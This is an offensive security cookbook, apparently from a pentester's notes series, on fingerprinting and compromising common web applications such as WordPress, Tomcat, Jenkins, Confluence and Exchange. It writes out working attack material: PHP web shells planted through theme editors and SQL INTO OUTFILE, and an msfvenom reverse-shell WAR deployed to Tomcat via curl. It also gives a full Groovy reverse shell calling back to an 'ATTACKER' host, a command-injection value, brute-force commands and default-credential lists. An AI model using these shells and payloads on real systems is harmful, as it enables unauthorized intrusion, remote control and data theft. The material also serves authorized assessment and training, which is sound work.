# 31 — Attacking Common Applications

Per-product attack notes for the apps most likely to appear during an internal/external assessment. For each: how to fingerprint, how to enumerate, the default-creds list, the high-impact CVEs you should know by name, and the path from low-priv to RCE.

## Contents

- [WordPress](#wordpress)
- [Joomla](#joomla)
- [Drupal](#drupal)
- [Tomcat](#tomcat)
- [Jenkins](#jenkins)
- [GitLab](#gitlab)
- [Splunk](#splunk)
- [Confluence / Jira (Atlassian)](#confluence-jira-atlassian)
- [JBoss / WildFly](#jboss-wildfly)
- [ColdFusion](#coldfusion)
- [phpMyAdmin](#phpmyadmin)
- [Adminer](#adminer)
- [OpenCart / Magento / PrestaShop / Shopware](#opencart-magento-prestashop-shopware)
- [SharePoint / OWA / Exchange](#sharepoint-owa-exchange)
- [CMS-style "low-effort" wins to always try](#cms-style-low-effort-wins-to-always-try)
- [Sources](#sources)

## WordPress

### Fingerprint

```
/wp-login.php          /wp-admin           /wp-content/        /readme.html
HTML: <meta name="generator" content="WordPress X.Y">
JS / CSS: ?ver=X.Y in asset URLs
```

### Enumeration

```bash
wpscan --url https://target --enumerate vp,vt,u,m,cb,dbe --random-user-agent
wpscan --url https://target --enumerate u --api-token <WPSCAN_TOKEN>      # known-vuln data
wpscan --url https://target --passwords passwords.txt --usernames admin --max-threads 5
```

Common manual recon:

```bash
curl -s https://target/wp-json/wp/v2/users          # REST API user list (unauth, often)
curl -s https://target/?author=1                     # author scan via redirect
curl -s https://target/wp-content/plugins/<plugin>/readme.txt
curl -s https://target/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

### Default / weak creds

`admin / admin`, `admin / password`, `admin / wordpress`, role-based (`editor`, `author`).

### Foothold paths

| Vector | How |
|---|---|
| Admin login → theme/plugin editor | Edit `404.php`/`functions.php` to PHP shell |
| Admin login → upload plugin | Upload a zipped malicious plugin |
| `xmlrpc.php` brute amplification | `system.multicall` does many guesses per HTTP request |
| Vulnerable plugin / theme | `searchsploit wordpress <plugin>`; many have unauth file uploads |
| `wp-config.php` disclosure | LFI / backup files (`wp-config.php~`, `wp-config.bak`) |

### Plugin-shell cookbook

After admin access:

```
Appearance → Theme Editor → 404.php
```

Replace with a one-liner:

```php
<?php system($_GET['c']); ?>
```

Then visit a 404 path:

```
https://target/this-does-not-exist?c=id
```

### CVEs to remember

- `WordPress core` — auth-required vulns are common; unauth core RCEs are rare and quickly patched.
- Plugins are the usual entry point: `Contact Form 7`, `WPBakery`, `Elementor`, `LearnPress`, `Royal Elementor`, etc. Search by exact plugin + version.

## Joomla

### Fingerprint

```
/administrator/index.php
/installation/index.php
/components/com_*/
/templates/<theme>/
```

```bash
joomscan -u https://target
droopescan scan joomla -u https://target
```

### Default / weak creds

`admin / admin`, lockout policies are usually weak.

### Foothold paths

- Admin → Templates → Edit `error.php` / `index.php` (any template) → save → request a path that loads it.
- Vulnerable component (`com_*`); historic SQLi / RCE plenty (`com_fields`, `com_media`, `com_users`).
- Configuration disclosure via misconfigured backup tools (`Akeeba`).

## Drupal

### Fingerprint

```
/CHANGELOG.txt
/sites/default/files/
/misc/drupal.js
/user/login
/?q=user
HTML: <meta name="Generator" content="Drupal X (https://www.drupal.org)">
```

```bash
droopescan scan drupal -u https://target
```

### Default / weak creds

`admin / admin`. Drupal does not lock by default unless `Login Security` module is installed.

### Foothold paths

- **Drupalgeddon 2 (CVE-2018-7600)** — unauth RCE on Drupal 7.x < 7.58, 8.x < 8.5.1. `python3 drupalgeddon2.py <target>`.
- **Drupalgeddon 3 (CVE-2018-7602)** — auth required, similar primitive.
- **CoolType / CKEditor** plugin issues.
- Admin → Modules → enable `PHP Filter` (Drupal 7) → create a node with PHP code.

## Tomcat

### Fingerprint

```
GET / HTTP/1.1     →  Server: Apache-Coyote/1.1
/manager/html
/host-manager/html
/examples/
/manager/text/
```

```bash
nmap -p 8080 -sV --script http-tomcat-version,http-headers <T>
```

### Default / weak creds

`tomcat / tomcat`, `tomcat / s3cret`, `admin / admin`, `manager / manager`. List in:

```
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

```bash
hydra -L users.txt -P passwords.txt -f <T> -s 8080 http-get /manager/html
netexec http <T> -u tomcat -p tomcat -M tomcat   # if a module exists for your version
```

### Foothold paths

```bash
# Build a WAR shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Deploy
curl -u tomcat:tomcat -T shell.war "https://target:8080/manager/text/deploy?path=/shell"

# Trigger
curl https://target:8080/shell/

# Undeploy when done
curl -u tomcat:tomcat "https://target:8080/manager/text/undeploy?path=/shell"
```

For Tomcat 7+ "JK Status Manager" disclosure, file inclusions in `examples/`, and AJP (`Ghostcat` CVE-2020-1938) — see specific advisories.

## Jenkins

### Fingerprint

```
/login            /script           /asynchPeople    /api/json    /jnlpJars/
HTML: "Jenkins" in <title>
X-Jenkins header in responses
```

### Default / weak creds

`admin / admin`. Anonymous "Read" is sometimes enabled — check `/asynchPeople/` and `/script` without auth.

### Foothold paths

| Path | What |
|---|---|
| `/script` (Groovy console) | Direct OS exec for admins |
| `/manage/configureSecurity/` | Disable security |
| Anonymous build + scriptable job | RCE without admin |
| `Build with parameters` ↔ value injection | When a job runs `sh "deploy ${BRANCH}"`, set `BRANCH` to `;id` |
| Old Jenkins CLI (CVE-2017-1000353) | Pre-auth deserialization |

### Groovy script console (`/script`) one-liner RCE

```groovy
def cmd = "id"
def proc = ["bash","-c",cmd].execute()
proc.waitFor()
println(proc.text)
```

Reverse shell (Linux):

```groovy
String host="ATTACKER"; int port=4444; String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush(); po.flush(); Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
}; p.destroy(); s.close();
```

## GitLab

### Fingerprint

```
/users/sign_in
/api/v4/version
HTML / JS: "GitLab" branding, `gon.gitlab_url`
```

### Foothold paths

- **Account takeover via password reset** — historic CVEs let attackers hijack reset emails.
- **CVE-2021-22205** — pre-auth RCE via ExifTool in image upload (GitLab 11.9 - 13.10.2). One of the most prolific real-world chains.
- **CVE-2023-7028** — password reset to attacker-controlled email.
- **Group/project token leakage** in repos: `git log -p | grep -E 'glpat-|ghp_|GITLAB_TOKEN'`.
- Authenticated SSRF (multiple CVEs in webhook / repo-import features).

## Splunk

### Fingerprint

```
/en-US/account/login
/services/server/info
TCP 8000 (web) / 8089 (mgmt) / 8088 (HEC)
```

### Default / weak creds

`admin / changeme` (older), `admin / SplunkAdmin`. Splunk Enterprise asks to change at first login but appliances are missed.

### Foothold paths

- **Custom app → script execution**: install a custom app (`splunk install app`); apps can register scripted inputs that execute as the Splunk user (often root).
- Authenticated `Splunk Web` editor for apps → upload tarball with `bin/script.sh` + `inputs.conf` running it.
- `Splunk-shells` repo has ready packaged apps for this.
- Old REST endpoint info-leaks (`/services/admin/users` without auth in misconfigured setups).

## Confluence / Jira (Atlassian)

### Fingerprint

```
/login.action
/setup/setupcheck.action
/rest/api/2/serverInfo (Jira)
HTML: AJS.params, "Atlassian"
```

### Foothold paths

| CVE | What |
|---|---|
| CVE-2019-3396 | Confluence Widget Connector SSTI → RCE (≤6.14.x) |
| CVE-2021-26084 | Confluence OGNL injection RCE (unauth) |
| CVE-2022-26134 | Confluence OGNL injection RCE (unauth, broad versions) |
| CVE-2023-22515 | Confluence privilege escalation (admin creation) |
| CVE-2023-22527 | Confluence template injection RCE (recent) |
| Jira: CVE-2021-26086 | LFI |
| Jira: CVE-2022-0540 | Jira Seraph auth bypass |

PoCs widely available on GitHub (verify version before launching anything destructive).

## JBoss / WildFly

### Fingerprint

```
/jmx-console/        /web-console/        /invoker/JMXInvokerServlet
TCP 8080 (web), 9990 (mgmt), 1099 (RMI)
```

```bash
nmap -p 8080,9990 --script http-jboss <T>
```

### Foothold paths

- `JMX-Console` admin → deploy WAR via `MainDeployer.deployURL()`.
- `web-console` → `Invoker` deserialization (CVE-2017-12149 etc.).
- `JMXInvokerServlet` Java deserialization.
- Default creds `admin / admin` on management console.

```bash
java -jar JexBoss.jar -u http://target:8080
```

## ColdFusion

### Fingerprint

```
/CFIDE/administrator/
/CFIDE/adminapi/
Server header: ColdFusion
```

### Foothold paths

- Admin password disclosure (CVE-2010-2861, CVE-2013-3336 — old but appears on legacy boxes).
- Authenticated upload → CFM shell.
- Recent: CVE-2023-26360 unauth deserialization.

## phpMyAdmin

```
/phpmyadmin/        /pma/        /phpMyAdmin/
```

After login (or default `root / <empty>` on dev boxes):

```sql
SHOW VARIABLES LIKE 'secure_file_priv';      -- if empty, file write is allowed
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/x.php';
```

Or use `Database → SQL` to run a stored XSS payload that reaches admin sessions.

## Adminer

```
/adminer.php        /adminer/
```

If reachable, login with stolen DB creds yields the same `INTO OUTFILE` primitive when the DB user has `FILE`.

## OpenCart / Magento / PrestaShop / Shopware

CMS-level + plugin-level CVEs dominate. Always:

1. Detect version (`/admin`, `/api/`, headers).
2. `searchsploit <product> <version>`.
3. Look for unauthenticated endpoints in plugins.

Magento "Adobe Commerce" specifically has a long history of unauth RCEs (CVE-2022-24086 most recent big one).

## SharePoint / OWA / Exchange

### Exchange

| CVE | Name | Note |
|---|---|---|
| CVE-2021-26855 + chain | ProxyLogon | SSRF + post-auth RCE |
| CVE-2021-34473 + chain | ProxyShell | URL rewriting → RCE |
| CVE-2022-41040 + 41082 | ProxyNotShell | auth required |
| CVE-2023-23397 | Outlook NTLM relay | client-side reminder UNC |

External Exchange exposes `/owa/`, `/ecp/`, `/EWS/`, `/Autodiscover/`, `/mapi/`. Username enumeration via timing on OWA login.

### SharePoint

- `/_vti_pwt/`, `/_layouts/15/start.aspx` discovery.
- ToolPaneView abuse (CVE-2019-0604).
- 2023 ToolShell chain (chained with workflow + NTLM).

## CMS-style "low-effort" wins to always try

- Admin login pages with default / vendor creds (SecLists `Default-Credentials/`).
- Backup files: `web.config.bak`, `wp-config.php~`, `.env`, `.env.local`, `config.old`, `dump.sql`.
- `.git/`, `.svn/`, `.hg/` exposed → `git-dumper` to recover full source.
- `phpinfo.php`, `info.php`, `test.php` — version disclosure.
- `/server-status`, `/server-info` (Apache mod_status / mod_info).
- WSDL endpoints, GraphQL `/graphql` introspection enabled.
- Swagger / OpenAPI under `/api-docs`, `/swagger-ui/`, `/v2/api-docs`.

## Sources

- HackTricks — Pentesting Web (per-app subpages): https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/
- WPScan: https://wpscan.com/
- joomscan / droopescan / cmseek (official repos)
- ExploitDB: https://www.exploit-db.com/
- CISA KEV: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Vendor advisories (Atlassian, Adobe, Splunk, Microsoft) — always cross-reference before exploitation.
